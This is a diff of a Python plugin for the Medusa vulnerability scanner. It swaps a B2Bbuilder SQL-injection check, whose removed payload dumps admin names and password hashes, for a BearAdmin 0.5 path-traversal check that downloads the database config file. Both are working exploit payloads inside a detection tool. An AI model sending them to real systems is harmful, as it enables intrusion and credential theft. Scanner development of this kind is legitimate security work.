@@ -6,17 +6,17 @@ import ClassCongregation
 class VulnerabilityInfo(object):
     def __init__(self,Medusa):
         self.info = {}
-        self.info['number']="0" #如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD
+        self.info['number']="CVE-2018-11413" #如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD
         self.info['author'] = "Ascotbe"  # 插件作者
-        self.info['createDate'] = "2020-1-15"  # 插件编辑时间
-        self.info['disclosure']='2015-05-18'#漏洞披露时间，如果不知道就写编写插件的时间
-        self.info['algroup'] = "B2BbuilderSQLInjectionVulnerability4"  # 插件名称
-        self.info['name'] ='B2BbuilderSQL注入漏洞4' #漏洞名称
-        self.info['affects'] = "B2Bbuilder"  # 漏洞组件
-        self.info['desc_content'] = " module\\company\\admin\\business_info_list.php其中del未过滤进入sql中，造成注入。"  # 漏洞描述
+        self.info['createDate'] = "2020-1-19"  # 插件编辑时间
+        self.info['disclosure']='2018-05-28'#漏洞披露时间，如果不知道就写编写插件的时间
+        self.info['algroup'] = "BearAdminArbitraryFileDownload"  # 插件名称
+        self.info['name'] ='BearAdmin任意文件下载' #漏洞名称
+        self.info['affects'] = "BearAdmin"  # 漏洞组件
+        self.info['desc_content'] = "BearAdmin 0.5版本中存在安全漏洞。远程攻击者可通过向/admin/databack/download.html页面发送带有目录遍历序列的‘name’参数利用该漏洞下载任意文件。"  # 漏洞描述
         self.info['rank'] = "高危"  # 漏洞等级
         self.info['suggest'] = "尽快升级最新系统"  # 修复建议
-        self.info['version'] = "无"  # 这边填漏洞影响的版本
+        self.info['version'] = "0.5"  # 这边填漏洞影响的版本
         self.info['details'] = Medusa  # 结果
 
 def UrlProcessing(url):
@@ -36,24 +36,22 @@ def medusa(Url,RandomAgent,ProxyIp):
     else:
         port = port
     try:
-
-        payload = '/main.php?m=company&s=admin/business_info_list'
+        payload = "/admin/databack/download.html?name=../application/database.php"
         payload_url = scheme + "://" + url +":"+ str(port)+ payload
 
-        data = "del[]=1) or updatexml(2,concat(0x7e,((select group_concat(user,0x5e,md5(c)) from hy_admin))),0) %23&updateID=11&cc=6750"
+
         headers = {
             'User-Agent': RandomAgent,
             'Content-Type': 'application/x-www-form-urlencoded',
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
         }
 
-
         s = requests.session()
-        resp = s.post(payload_url,data=data,headers=headers, timeout=6, verify=False)
+        resp = s.get(payload_url,headers=headers, timeout=6, verify=False)
         con = resp.text
         code = resp.status_code
-        if code == 200 and con.find("4a8a08f09d37b73795649038408b5f33") != -1:
-            Medusa = "{}存在B2BbuilderSQL注入漏洞\r\n 验证数据:\r\nUrl:{}\r\nPost数据:{}\r\n返回内容:{}\r\n".format(url,payload_url,data,con)
+        if code == 200 and con.find("数据库名") != -1:
+            Medusa = "{}存在BearAdmin任意文件下载漏洞\r\n 验证数据:\r\nUrl:{}\r\n返回内容:{}\r\n".format(url,payload_url,con)
             _t=VulnerabilityInfo(Medusa)
             web=ClassCongregation.VulnerabilityDetails(_t.info)
             web.High() # serious表示严重，High表示高危，Intermediate表示中危，Low表示低危
